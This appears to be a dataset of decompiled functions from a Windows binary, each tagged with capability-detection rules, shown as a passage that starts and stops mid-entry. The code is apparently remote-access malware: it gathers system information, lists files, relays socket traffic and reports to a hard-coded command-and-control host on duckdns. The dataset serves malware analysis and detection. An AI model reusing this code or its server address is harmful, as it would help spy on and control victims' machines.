{\n                            uVar4 = fcn.004081aa(\"4RSdf.SC5\");\n                            iVar3 = fcn.00412861(uVar4, auStack1864);\n                            if (iVar3 == 0) {\n                                fcn.004127a8(auStack1072, 0x204, 0x4233dd, unaff_EDI, auStack1864);\n                                apcStack556[0] = fcn.0040d745(auStack1072);\n                                if (apcStack556[0] != NULL) {\n                                    uVar5 = 0xffffffff;\n                                    pcVar6 = apcStack556[0];\n                                    do {\n                                        if (uVar5 == 0) break;\n                                        uVar5 = uVar5 - 1;\n                                        cVar1 = *pcVar6;\n                                        pcVar6 = pcVar6 + 1;\n                                    } while (cVar1 != '\\0');\n                                    uVar4 = fcn.00412abf(unaff_retaddr, *0x42b5c0, apcStack556, ~uVar5 - 1, 1);\n                                    *unaff_retaddr = uVar4;\n                                    *0x42b5c0 = *0x42b5c0 + (~uVar5 - 1);\n                                }\n                            }\n                        }\n                        else {\n                            fcn.004127a8(apcStack556, 0x204, 0x4233dd, unaff_EDI, auStack1864);\n                            fcn.0040db1c(apcStack556, unaff_EBP + 1, unaff_retaddr);\n                        }\n                    }\n                }\n                iVar3 = sub.KERNEL32.dll_FindNextFileA(iVar2, auStack1908);\n            } while (iVar3 != 0);\n            sub.KERNEL32.dll_FindClose();\n        }\n    }\n    return;\n}\n",
        "token_count": 724
    },
    "00411770": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00411770(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iStack620;\n    uint *puStack616;\n    uint uStack612;\n    uint *puStack608;\n    uint *puStack604;\n    int32_t iStack576;\n    int32_t iStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    int32_t iStack544;\n    int32_t iStack540;\n    uint uStack288;\n    int32_t iStack284;\n    int32_t iStack280;\n    uint uStack76;\n    int32_t iStack64;\n    uint uStack56;\n    uchar auStack52 [16];\n    uint uStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    iStack620 = 0x4000;\n    iStack560 = sub.msvcrt.dll_malloc();\n    if (iStack560 != 0) {\n        iStack576 = param_2;\n        if (param_2 < param_1) {\n            iStack576 = param_1;\n        }\n        iStack576 = iStack576 + 1;\n        do {\n            do {\n                do {\n                    uStack556 = 0x1e;\n                    uStack552 = 0;\n                    uStack548 = 1;\n                    iStack544 = param_2;\n                    if (param_2 != param_1) {\n                        uStack548 = 2;\n                        iStack540 = param_1;\n                    }\n                    iStack284 = param_2;\n                    uStack288 = 1;\n                    if (param_2 != param_1) {\n                        uStack288 = 2;\n                        iStack280 = param_1;\n                    }\n                    puStack604 = &uStack556;\n                    uStack612 = 0;\n                    iStack620 = iStack576;\n                    puStack616 = &uStack548;\n                    puStack608 = &uStack288;\n                    iVar1 = sub.WS2_32.dll_select();\n                } while (iVar1 == 0);\n                if (((iVar1 < 0) || (iStack620 = unaff_EBX,  iVar1 = sub.WS2_32.dll___WSAFDIsSet(),  iVar1 != 0)) ||\n                   (puVar4 = &uStack288,  iVar1 = sub.WS2_32.dll___WSAFDIsSet(uStack20, &uStack288),  iVar1 != 0))\n                goto code_r0x0041182f;\n                iVar1 = sub.WS2_32.dll___WSAFDIsSet(uStack28, &uStack548);\n                if (iVar1 != 0) {\n                    iVar1 = sub.WS2_32.dll_recv(uStack36, puStack604, 0x4000, 0);\n                    if (iVar1 < 1) goto code_r0x0041182f;\n                    iVar3 = 0;\n                    do {\n                        iVar2 = sub.WS2_32.dll_send(uStack56, iStack620 + iVar3, iVar1, 0);\n                        if (iVar2 == -1) {\n                            iVar2 = fcn.004051b0();\n                            if (iVar2 != 0x2733) break;\n                            fcn.00407ef4();\n                        }\n                        else {\n                            iVar1 = iVar1 - iVar2;\n                            iVar3 = iVar3 + iVar2;\n                        }\n                    } while (iVar3 < iVar1);\n                    if (iVar1 != 0) goto code_r0x0041182f;\n                }\n                iVar1 = sub.WS2_32.dll___WSAFDIsSet(uStack56, &uStack548);\n            } while (iVar1 == 0);\n            iStack620 = iStack64;\n            iVar1 = sub.WS2_32.dll_recv();\n            if (iVar1 < 1) break;\n            iVar3 = 0;\n            do {\n                iVar2 = sub.WS2_32.dll_send(uStack76, puVar4 + iVar3, iVar1, 0);\n                if (iVar2 == -1) {\n                    iVar2 = fcn.004051b0();\n                    if (iVar2 != 0x2733) break;\n                    iStack620 = 1;\n                    fcn.00407ef4();\n                }\n                else {\n                    iVar1 = iVar1 - iVar2;\n                    iVar3 = iVar3 + iVar2;\n                }\n            } while (iVar3 < iVar1);\n        } while (iVar1 == 0);\ncode_r0x0041182f:\n        fcn.00407f59(&iStack620);\n        fcn.00405999(&uStack56);\n        fcn.00405999(auStack52);\n    }\n    return;\n}\n",
        "token_count": 1073
    },
    "004129fb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004129fb(int32_t param_1, char param_2, int32_t param_3, int32_t param_4, uint32_t param_5)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_1 == 0) {\ncode_r0x00412a12:\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar4 = 0;\n        fcn.004129e4(param_4, 0, param_5);\n        iVar2 = fcn.0041299e(param_2, param_1);\n        for (iVar3 = 0; iVar3 < param_3 + -1; iVar3 = iVar3 + 1) {\n            if (iVar2 == -1) goto code_r0x00412a12;\n            iVar4 = iVar4 + iVar2;\n            iVar2 = fcn.0041299e(param_2, param_1 + iVar4);\n        }\n        for (uVar1 = 0; (uVar1 + iVar4 < iVar4 + -1 + iVar2 && (uVar1 < param_5)); uVar1 = uVar1 + 1) {\n            *(param_4 + uVar1) = *(param_1 + iVar4 + uVar1);\n        }\n        *(param_4 + uVar1) = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 331
    },
    "00413748": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00413748(uint param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    uchar uVar3;\n    uchar uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint uStack1792;\n    uint uStack1788;\n    uint uStack1784;\n    uint uStack1780;\n    uint uStack1776;\n    uint uStack1772;\n    uint uStack1768;\n    uchar auStack1760 [32];\n    uchar auStack1728 [32];\n    uchar auStack1696 [64];\n    uchar auStack1632 [64];\n    uchar auStack1568 [512];\n    uchar auStack1056 [512];\n    uchar auStack544 [528];\n    \n    fcn.004130e8(auStack1696, 0x40);\n    fcn.00413040(auStack1632, 0x40);\n    fcn.0041359f(auStack1056, 0x200);\n    fcn.004134d1(auStack1568, 0x200);\n    fcn.004134fd(&uStack1788);\n    cVar2 = fcn.00407c77(auStack544, 0x204);\n    if (cVar2 == '\\0') {\n        fcn.00412548(auStack544, \"Unknown\", 0x204);\n    }\n    fcn.00408218(auStack1760, 0x20, 0);\n    fcn.004082c4(auStack1728, 0x20);\n    uVar1 = *0x422830;\n    uStack1792 = 0;\n    uVar3 = fcn.004082e8(0x40);\n    uVar5 = fcn.004101f1();\n    uVar6 = fcn.00408e66();\n    uVar7 = fcn.00408e53();\n    uVar8 = sub.msvcrt.dll_getenv(\"PATH\");\n    uVar9 = sub.msvcrt.dll_getenv(\"WINDIR\");\n    uVar4 = fcn.004135f2();\n    iVar10 = fcn.00412755(&uStack1792, \n                          \"%s\\a%s\\a%s\\a%s\\a%I64u\\a%I64u\\a%I64u\\a%d\\a%s\\a%s\\a%s\\a%s\\a%s\\a%s\\a%d\\a%d\\a%s\\a%d\\a%s\\a%d\\a%s\\a%d\\a\"\n                          , auStack1568, auStack1696, auStack1632, auStack1056, uStack1788, uStack1784, uStack1780, \n                          uStack1776, uStack1772, uStack1768, uVar4, uVar9, uVar8, auStack1760, auStack1728, \n                          \"podzeye.duckdns.org:3360;\", 0x422600, uVar7, uVar6, \"oluchi\", uVar5, auStack544, uVar3, \n                          0x422400, uVar1);\n    if (iVar10 == -1) {\n        fcn.00405d7d(param_1, 0xbb, 0, 0);\n    }\n    else {\n        fcn.00405d7d(param_1, 0xba, uStack1792, iVar10);\n        fcn.00407f59(&uStack1792);\n    }\n    return;\n}\n",
        "token_count": 779
    },
    "00413a85": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00413a85(uint param_1, uint param_2, uint8_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint uVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uchar auStack3496 [228];\n    uchar auStack3268 [580];\n    uchar auStack2688 [452];\n    uchar auStack2236 [516];\n    uint uStack1720;\n    uint8_t auStack1688 [8];\n    uchar auStack1680 [20];\n    uint uStack1660;\n    uint uStack1656;\n    uchar auStack1644 [580];\n    uchar auStack1064 [1004];\n    uint uStack60;\n    \n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar2 = fcn.004127a8(auStack2688, 0x204, 0x4245c4, param_1);\n    if (iVar2 != -1) {\n        uVar8 = 0xfde9;\n        sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, auStack2688, 0x204, auStack1064, 0x204);\n        iVar2 = sub.KERNEL32.dll_FindFirstFileW(auStack1064, auStack1680);\n        if (iVar2 != -1) {\n            uVar3 = param_3;\n            do {\n                iVar4 = fcn.00412861(auStack1644, 0x4245c8);\n                if (iVar4 != 0) {\n                    iVar4 = fcn.00412861(auStack1644, 0x4245ca);\n                    if (iVar4 != 0) {\n                        if ((auStack1688[0] & 0x10) == 0) {\n                            uVar6 = 0xffffffff;\n                            puVar7 = auStack1644;\n                            sub.KERNEL32.dll_WideCharToMultiByte\n                                      (0xfde9, 0, auStack1644, 0xffffffff, auStack3496, 0x104, 0, 0, uVar8, uVar3, \n                                       uStack1660, uStack1656);\n                            iVar4 = fcn.004127a8(auStack3268, 0x204, \"%d:%I64u:%s%s;\", uStack1720, uVar6, puVar7, \n                                                 param_1, auStack3496);\n                            if (iVar4 != -1) {\n                                fcn.00412458(uStack60, auStack3268, iVar4);\n                            }\n                        }\n                        else {\n                            uVar6 = 0;\n                            sub.KERNEL32.dll_WideCharToMultiByte\n                                      (0xfde9, 0, auStack1644, 0xffffffff, auStack3496, 0x104, 0, 0, uVar8, uVar3);\n                            puVar7 = auStack3268;\n                            puVar5 = auStack3496;\n                            iVar4 = fcn.004127a8(puVar7, 0x204, \"%d:%s%s;\", uStack1720, param_1, auStack3496);\n                            if (iVar4 != -1) {\n                                fcn.00412458(uStack60, puVar7, iVar4);\n                            }\n                            fcn.004127a8(auStack2236, 0x204, \"%s%s\\\\\", param_1, auStack3496, puVar5);\n                            fcn.00413a85(auStack2236, uStack60, uVar6);\n                        }\n                    }\n                }\n                iVar4 = sub.KERNEL32.dll_FindNextFileW(iVar2, auStack1688);\n                if (iVar4 == 0) break;\n                cVar1 = fcn.00413a0f();\n            } while (cVar1 != '\\0');\n            sub.KERNEL32.dll_FindClose();\n        }\n    }\n    return;\n}\n",
        "token_count": 903
    },
    "00408c65": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00408c65(void)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uchar auStack544 [4];\n    uchar auStack540 [524];\n    \n    iVar9 = 0;\n    fcn.00408b1a();\n    pcVar4 = sub.msvcrt.dll_malloc(0x48);\n    *0x42b308 = pcVar4;\n    *(pcVar4 + 0x44) = pcVar4;\n    iVar5 = fcn.0041297a(0x3b, \"podzeye.duckdns.org:3360;\");\n    do {\n        iVar9 = iVar9 + 1;\n        *0x42b308 = *(*0x42b308 + 0x44);\n        fcn.004129fb(\"podzeye.duckdns.org:3360;\", 0x3b, iVar9, auStack540, 0x200);\n        fcn.004129fb(auStack540, 0x3a, 1, *0x42b308, 0x40);\n        pcVar3 = *0x42b308;\n        uVar8 = 0xffffffff;\n        pcVar10 = *0x42b308;\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar2 = *pcVar10;\n            pcVar10 = pcVar10 + 1;\n        } while (cVar2 != '\\0');\n        uVar6 = fcn.00412666(auStack540 + ~uVar8);\n        pcVar10 = *0x42b308;\n        *(pcVar3 + 0x40) = uVar6;\n        uVar6 = sub.msvcrt.dll_malloc(0x48);\n        *(pcVar10 + 0x44) = uVar6;\n    } while (iVar5 != iVar9);\n    fcn.00407f59(pcVar10 + 0x44);\n    ppcVar1 = *0x42b308 + 0x44;\n    *0x42b308 = pcVar4;\n    *ppcVar1 = pcVar4;\n    iVar9 = 0;\n    iVar5 = fcn.0041297a(0x3b, 0x422600);\n    do {\n        if (iVar5 <= iVar9) {\n            return;\n        }\n        iVar9 = iVar9 + 1;\n        puVar7 = sub.msvcrt.dll_malloc(0x8c);\n        fcn.004129fb(0x422600, 0x3b, iVar9, auStack540, 0x200);\n        fcn.004129fb(auStack540, 0x3a, 1, auStack544, 4);\n        fcn.004129fb(auStack540, 0x3a, 2, puVar7 + 1, 0x40);\n        uVar6 = fcn.00412666(auStack544);\n        uVar8 = 0xffffffff;\n        *puVar7 = uVar6;\n        puVar11 = puVar7 + 1;\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar2 = *puVar11;\n            puVar11 = puVar11 + 1;\n        } while (cVar2 != '\\0');\n        uVar6 = fcn.00412666(auStack540 + ~uVar8 + 2);\n        puVar7[0x11] = uVar6;\n        puVar7[0x22] = *0x42b304;\n        *0x42b304 = puVar7;\n    } while( true );\n}\n",
        "token_count": 889
    },
    "0040a2c3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a2c3(uint *param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar auStack156 [32];\n    uchar auStack124 [32];\n    uchar auStack92 [32];\n    uchar auStack60 [16];\n    uchar auStack44 [28];\n    \n    fcn.004102d5(auStack156, 0x20);\n    fcn.004102d5(0x42e280, 0x10);\n    fcn.0040a23c(\"oluchi\", auStack156, auStack124);\n    iVar2 = fcn.00403c36(0x42e2a0, auStack124, 0x20);\n    if (iVar2 == 0) {\n        uVar1 = fcn.00403cb2(0x42e2a0, 0x42e280, 0x422834, auStack44, 0x10, 0);\n        if (uVar1 != 0) {\n            fcn.00412aa3(auStack92, auStack156, 0x20);\n            fcn.00412aa3(auStack60, 0x42e280, 0x10);\n            uVar3 = fcn.00405d7d(*param_1, 0x99, auStack92, 0x40);\n            goto code_r0x0040a3d1;\n        }\n    }\n    uVar1 = 0;\n    uVar3 = fcn.00405999(param_1);\ncode_r0x0040a3d1:\n    return uVar3 & 0xffffff00 | uVar1;\n}\n",
        "token_count": 385
    },
    "00410ec3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00410ec3(uint param_1, uint param_2, uint param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar uStack553;\n    uint auStack552 [3];\n    uchar auStack540 [524];\n    \n    uStack553 = 8;\n    uVar2 = fcn.004127a8(auStack540, 0x200, \"%lu\\a%s\\a\", param_2, param_3);\n    fcn.0041236c(auStack552, 0x10000);\n    fcn.00412458(auStack552, auStack540, uVar2);\n    cVar1 = fcn.004109d8(param_2, param_3, auStack552);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n        auStack552[0] = 0;\n        uVar3 = 0xe7;\n    }\n    else {\n        fcn.00412458(auStack552, &uStack553, 1);\n        fcn.00410ada(param_2, param_3, auStack552);\n        uVar2 = fcn.00412540(auStack552);\n        uVar3 = 0xe6;\n    }\n    fcn.00405d7d(param_1, uVar3, auStack552[0], uVar2);\n    fcn.004123b1(auStack552);\n    return;\n}\n",
        "token_count": 329
    },
    "0041ed42": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.0041ed42(void)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint uStack20;\n    \n    uStack20 = 0x41ed50;\n    iVar4 = fcn.0041f3f0();\n    iVar4 = -iVar4;\n    iVar3 = *(&stack0x00010050 + iVar4);\n    uVar7 = *(&stack0x00010054 + iVar4);\n    if (iVar3 != 0) {\n        puVar1 = &stack0x00000030 + iVar4;\n        puVar8 = puVar1;\n        for (iVar6 = 0x4000; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        puVar8 = &stack0x0000000c + iVar4;\n        for (iVar6 = 9; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *(&stack0xfffffff4 + iVar4) = &stack0x0000000c + iVar4;\n        *(&stack0xfffffff0 + iVar4) = uVar7;\n        *(&stack0xffffffec + iVar4) = 0x41ed94;\n        iVar6 = sub.msvcrt.dll__stat();\n        if (iVar6 == 0) {\n            uVar2 = *(&stack0x00000012 + iVar4);\n            if ((uVar2 & 0x80) == 0) {\n                *(iVar3 + 0x4e008) = *(iVar3 + 0x4e008) | 1;\n            }\n            *(iVar3 + 0x4e008) = *(iVar3 + 0x4e008) | uVar2 << 0x10;\n            *(iVar3 + 0x4e00c) = *(&stack0x00000028 + iVar4);\n            *(&stack0xfffffff0 + iVar4) = uVar7;\n            *(&stack0xfffffff4 + iVar4) = 0x424983;\n            *(&stack0xffffffec + iVar4) = 0x41edcb;\n            iVar6 = sub.msvcrt.dll_fopen();\n            if (iVar6 != 0) {\n                do {\n                    *(&stack0xfffffffc + iVar4) = iVar6;\n                    *(&stack0xfffffff8 + iVar4) = 0x10000;\n                    *(&stack0xfffffff4 + iVar4) = 1;\n                    *(&stack0xfffffff0 + iVar4) = puVar1;\n                    *(&stack0xffffffec + iVar4) = 0x41eded;\n                    iVar5 = sub.msvcrt.dll_fread();\n                    if (iVar5 == 0) {\n                        uVar7 = 0;\n                        goto code_r0x0041ee0c;\n                    }\n                    *(&stack0xfffffff8 + iVar4) = iVar5;\n                    *(&stack0xfffffff4 + iVar4) = puVar1;\n                    *(&stack0xfffffff0 + iVar4) = iVar3;\n                    *(&stack0xffffffec + iVar4) = 0x41ee01;\n                    iVar5 = fcn.0041ec81();\n                } while (-1 < iVar5);\n                uVar7 = 0xffffffff;\ncode_r0x0041ee0c:\n                *(&stack0xfffffff0 + iVar4) = iVar6;\n                *(&stack0xffffffec + iVar4) = 0x41ee14;\n                sub.msvcrt.dll_fclose();\n                return uVar7;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 892
    },
    "00402afc": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nulong __thiscall fcn.00402afc(int32_t param_1, uint32_t *param_2, uint8_t *param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    *param_2 = param_3[1] << 0x10 ^ *param_3 << 0x18 ^ param_3[3] ^ param_3[2] << 8;\n    param_2[1] = param_3[5] << 0x10 ^ param_3[4] << 0x18 ^ param_3[7] ^ param_3[6] << 8;\n    param_2[2] = param_3[9] << 0x10 ^ param_3[8] << 0x18 ^ param_3[0xb] ^ param_3[10] << 8;\n    param_2[3] = param_3[0xd] << 0x10 ^ param_3[0xc] << 0x18 ^ param_3[0xf] ^ param_3[0xe] << 8;\n    if (param_4 == 0x10) {\n        iVar4 = 0;\n        while( true ) {\n            uVar1 = param_2[3];\n            uVar2 = *param_2 ^ *(iVar4 + 0x422ce0) ^ *((uVar1 & 0xff) * 4 + 0x42c600) & 0xff00 ^\n                    *((uVar1 >> 0x18) * 4 + 0x42c600) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) & 0xff000000 ^\n                    *((uVar1 >> 8 & 0xff) * 4 + 0x42c600) & 0xff0000;\n            param_2[4] = uVar2;\n            uVar2 = uVar2 ^ param_2[1];\n            param_2[5] = uVar2;\n            uVar2 = uVar2 ^ param_2[2];\n            param_2[6] = uVar2;\n            param_2[7] = uVar2 ^ uVar1;\n            if (iVar4 + 4 == 0x28) break;\n            param_2 = param_2 + 4;\n            iVar4 = iVar4 + 4;\n        }\n        uVar3 = 10;\n        iStack20 = param_1;\n    }\n    else {\n        param_2[4] = param_3[0x11] << 0x10 ^ param_3[0x10] << 0x18 ^ param_3[0x13] ^ param_3[0x12] << 8;\n        param_2[5] = param_3[0x15] << 0x10 ^ param_3[0x14] << 0x18 ^ param_3[0x17] ^ param_3[0x16] << 8;\n        if (param_4 == 0x18) {\n            iVar4 = 0;\n            while( true ) {\n                uVar1 = param_2[5];\n                uVar2 = *param_2 ^ *(iVar4 + 0x422ce0) ^ *((uVar1 & 0xff) * 4 + 0x42c600) & 0xff00 ^\n                        *((uVar1 >> 0x18) * 4 + 0x42c600) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) & 0xff000000 ^\n                        *((uVar1 >> 8 & 0xff) * 4 + 0x42c600) & 0xff0000;\n                param_2[6] = uVar2;\n                uVar2 = uVar2 ^ param_2[1];\n                param_2[7] = uVar2;\n                uVar2 = uVar2 ^ param_2[2];\n                param_2[8] = uVar2;\n                uVar2 = uVar2 ^ param_2[3];\n                param_2[9] = uVar2;\n                if (iVar4 + 4 == 0x20) break;\n                uVar2 = uVar2 ^ param_2[4];\n                param_2[10] = uVar2;\n                param_2[0xb] = uVar2 ^ uVar1;\n                param_2 = param_2 + 6;\n                iVar4 = iVar4 + 4;\n            }\n            uVar3 = 0xc;\n            iStack20 = param_1;\n        }\n        else {\n            param_2[6] = param_3[0x19] << 0x10 ^ param_3[0x18] << 0x18 ^ param_3[0x1b] ^ param_3[0x1a] << 8;\n            param_2[7] = param_3[0x1f] ^ param_3[0x1d] << 0x10 ^ param_3[0x1c] << 0x18 ^ param_3[0x1e] << 8;\n            uVar3 = 0;\n            iStack20 = param_1;\n            if (param_4 == 0x20) {\n                iStack20 = 0;\n                while( true ) {\n                    uVar1 = param_2[7];\n                    iVar4 = iStack20 + 4;\n                    uVar2 = *((uVar1 & 0xff) * 4 + 0x42c600) & 0xff00 ^ *param_2 ^ *(iStack20 + 0x422ce0) ^\n                            *((uVar1 >> 0x18) * 4 + 0x42c600) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) & 0xff000000 ^\n                            *((uVar1 >> 8 & 0xff) * 4 + 0x42c600) & 0xff0000;\n                    param_2[8] = uVar2;\n                    uVar2 = uVar2 ^ param_2[1];\n                    param_2[9] = uVar2;\n                    uVar2 = uVar2 ^ param_2[2];\n                    param_2[10] = uVar2;\n                    uVar2 = uVar2 ^ param_2[3];\n                    param_2[0xb] = uVar2;\n                    iStack20 = iVar4;\n                    if (iVar4 == 0x1c) break;\n                    uVar2 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x42c600) & 0xff0000 ^\n                            *((uVar2 >> 0x18) * 4 + 0x42c600) & 0xff000000 ^ *((uVar2 & 0xff) * 4 + 0x42c600) ^\n                            param_2[4] ^ *((uVar2 >> 8 & 0xff) * 4 + 0x42c600) & 0xff00;\n                    param_2[0xc] = uVar2;\n                    uVar2 = uVar2 ^ param_2[5];\n                    param_2[0xd] = uVar2;\n                    uVar2 = uVar2 ^ param_2[6];\n                    param_2[0xe] = uVar2;\n                    param_2[0xf] = uVar2 ^ uVar1;\n                    param_2 = param_2 + 8;\n                }\n                uVar3 = 0xe;\n            }\n        }\n    }\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 1766
    },
    "00403047": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.00403047(uint32_t *param_1, uint8_t *param_2, uchar *param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    \n    uStack32 = param_2[1] << 0x10 ^ *param_2 << 0x18 ^ param_2[3] ^ param_2[2] << 8 ^ *param_1;\n    uStack28 = param_2[4] << 0x18 ^ param_2[5] << 0x10 ^ param_2[7] ^ param_2[6] << 8 ^ param_1[1];\n    uVar4 = param_2[8] << 0x18 ^ param_2[9] << 0x10 ^ param_2[0xb] ^ param_2[10] << 8 ^ param_1[2];\n    uVar3 = param_2[0xe] << 8 ^ param_2[0xf] ^ param_2[0xd] << 0x10 ^ param_2[0xc] << 0x18 ^ param_1[3];\n    puVar8 = param_1;\n    uStack24 = *(param_1 + 0x78) >> 1;\n    while( true ) {\n        uVar5 = *((uStack32 >> 0x18) * 4 + 0x42da00) ^ *((uVar3 & 0xff) * 4 + 0x42de00) ^ puVar8[4] ^\n                *((uStack28 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar4 >> 8 & 0xff) * 4 + 0x42d600);\n        uVar6 = *((uStack28 >> 0x18) * 4 + 0x42da00) ^ *((uStack32 & 0xff) * 4 + 0x42de00) ^ puVar8[5] ^\n                *((uVar4 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x42d600);\n        uVar7 = *((uVar4 >> 0x18) * 4 + 0x42da00) ^ *((uStack28 & 0xff) * 4 + 0x42de00) ^ puVar8[6] ^\n                *((uVar3 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uStack32 >> 8 & 0xff) * 4 + 0x42d600);\n        uVar3 = *((uVar3 >> 0x18) * 4 + 0x42da00) ^ *((uVar4 & 0xff) * 4 + 0x42de00) ^ puVar8[7] ^\n                *((uStack32 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uStack28 >> 8 & 0xff) * 4 + 0x42d600);\n        uStack24 = uStack24 - 1;\n        if (uStack24 == 0) break;\n        uStack32 = *((uVar5 >> 0x18) * 4 + 0x42da00) ^ *((uVar3 & 0xff) * 4 + 0x42de00) ^ puVar8[8] ^\n                   *((uVar6 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x42d600);\n        uStack28 = *((uVar6 >> 0x18) * 4 + 0x42da00) ^ *((uVar5 & 0xff) * 4 + 0x42de00) ^ puVar8[9] ^\n                   *((uVar7 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x42d600);\n        uVar4 = *((uVar7 >> 0x18) * 4 + 0x42da00) ^ *((uVar6 & 0xff) * 4 + 0x42de00) ^ puVar8[10] ^\n                *((uVar3 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x42d600);\n        uVar3 = *((uVar3 >> 0x18) * 4 + 0x42da00) ^ *((uVar7 & 0xff) * 4 + 0x42de00) ^ puVar8[0xb] ^\n                *((uVar5 >> 0x10 & 0xff) * 4 + 0x42ce00) ^ *((uVar6 >> 8 & 0xff) * 4 + 0x42d600);\n        puVar8 = puVar8 + 8;\n    }\n    param_1 = param_1 + (*(param_1 + 0x78) >> 1) * 8;\n    uVar4 = *param_1;\n    uVar9 = uVar4 ^ *((uVar5 >> 0x18) * 4 + 0x42c600) & 0xff000000 ^ *((uVar3 & 0xff) * 4 + 0x42c600);\n    uVar1 = *((uVar6 >> 0x10 & 0xff) * 4 + 0x42c600);\n    uVar2 = *((uVar7 >> 8 & 0xff) * 4 + 0x42c600);\n    param_3[3] = uVar9;\n    *param_3 = uVar9 >> 0x18;\n    param_3[1] = uVar4 >> 0x10 ^ uVar1 >> 0x10;\n    param_3[2] = uVar4 >> 8 ^ uVar2 >> 8;\n    uVar4 = param_1[1];\n    uVar9 = *((uVar6 >> 0x18) * 4 + 0x42c600) & 0xff000000 ^ *((uVar5 & 0xff) * 4 + 0x42c600) ^ uVar4;\n    uVar1 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x42c600);\n    uVar2 = *((uVar3 >> 8 & 0xff) * 4 + 0x42c600);\n    param_3[7] = uVar9;\n    param_3[4] = uVar9 >> 0x18;\n    param_3[5] = uVar4 >> 0x10 ^ uVar1 >> 0x10;\n    param_3[6] = uVar4 >> 8 ^ uVar2 >> 8;\n    uVar4 = param_1[2];\n    uVar9 = *((uVar7 >> 0x18) * 4 + 0x42c600) & 0xff000000 ^ *((uVar6 & 0xff) * 4 + 